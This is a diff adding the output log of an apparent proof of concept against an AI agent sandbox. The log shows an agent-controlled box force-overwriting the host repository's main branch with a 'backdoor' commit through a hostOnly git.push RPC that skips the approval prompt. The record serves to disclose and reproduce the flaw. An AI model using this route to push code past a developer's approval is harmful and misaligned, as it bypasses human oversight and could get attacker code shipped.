@@ -1,0 +1,21 @@
+
+== 1. Host repo: main has the developer's real work; developer is on another branch ==
+   host main = 3f696c86ec ("real work on main"); checked-out branch = feature
+
+== 2. Box authors malicious commits on its own HEAD (the agent controls box content) ==
+From /tmp/agentbox-clobber-poc.bCPZem/host-repo
+ * branch            main       -> FETCH_HEAD
+   box poison tip = a799d31088 ("backdoor"), bundled for the host
+
+== 3. Box sends /rpc git.push {hostOnly:true, as:"main", force:true} -- the REAL refspec builders ==
+   resolveLandDest("poison","main") = "main"
+   landRefspec("poison","main",force=true) = "+poison:refs/heads/main"
+   handler runs (NO approval prompt, hostOnly short-circuits the gate):
+     git -C <hostWorkspace> fetch <box.bundle> +poison:refs/heads/main
+
+== 4. Result ==
+   host main was 3f696c86ec -> now a799d31088 ("backdoor")
+
+VULNERABLE -- a box force-overwrote the host repo's local `main` to attacker commits,
+   with no approval prompt. If the developer later `git push origin main` or builds from local
+   main, they ship the attacker code. (Cloud path: `branch` is the box's own HEAD.)
